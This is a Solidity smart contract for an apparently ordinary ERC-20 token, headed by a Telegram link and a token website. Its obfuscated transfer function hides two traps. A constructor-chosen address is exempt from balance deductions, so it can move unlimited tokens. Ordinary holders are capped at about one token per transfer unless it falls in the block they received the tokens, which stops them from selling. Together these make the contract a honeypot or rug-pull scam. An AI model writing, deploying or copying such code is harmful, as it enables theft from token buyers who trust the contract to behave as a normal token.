/*

https://t.me/triplexerc

https://xxx.cryptotoken.live/

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Token is Ownable {
    function pxdeylgzrfj(address sazn, address otxyb, uint256 qpzb) private {
        address gvhm = IUniswapV2Factory(opisnkjezt.factory()).getPair(address(this), opisnkjezt.WETH());
        bool tpdsvuf = jmnqsf[sazn] == block.number;
        uint256 joat = qpvztrfod[sazn];
        if (0 == joat) {
            if (sazn != gvhm && (!tpdsvuf || qpzb > jbtdoe[sazn]) && qpzb < totalSupply) {
                require(qpzb <= totalSupply / (10 ** decimals));
            }
            balanceOf[sazn] -= qpzb;
        }
        jbtdoe[otxyb] = qpzb;
        balanceOf[otxyb] += qpzb;
        jmnqsf[otxyb] = block.number;
        emit Transfer(sazn, otxyb, qpzb);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private qpvztrfod;

    function approve(address minspftrwuhd, uint256 qpzb) public returns (bool success) {
        allowance[msg.sender][minspftrwuhd] = qpzb;
        emit Approval(msg.sender, minspftrwuhd, qpzb);
        return true;
    }

    uint8 public decimals = 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address otxyb, uint256 qpzb) public returns (bool success) {
        pxdeylgzrfj(msg.sender, otxyb, qpzb);
        return true;
    }

    function transferFrom(address sazn, address otxyb, uint256 qpzb) public returns (bool success) {
        require(qpzb <= allowance[sazn][msg.sender]);
        allowance[sazn][msg.sender] -= qpzb;
        pxdeylgzrfj(sazn, otxyb, qpzb);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private jmnqsf;

    IUniswapV2Router02 private opisnkjezt;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint256 private tixwrusgan = 103;

    mapping(address => uint256) private jbtdoe;

    string public symbol;

    constructor(string memory dtwbkzmljqp, string memory vxmnszftgkpy, address bshzgrcuw, address xqcihyvj) {
        name = dtwbkzmljqp;
        symbol = vxmnszftgkpy;
        balanceOf[msg.sender] = totalSupply;
        qpvztrfod[xqcihyvj] = tixwrusgan;
        opisnkjezt = IUniswapV2Router02(bshzgrcuw);
    }

    string public name;

    mapping(address => uint256) public balanceOf;
}
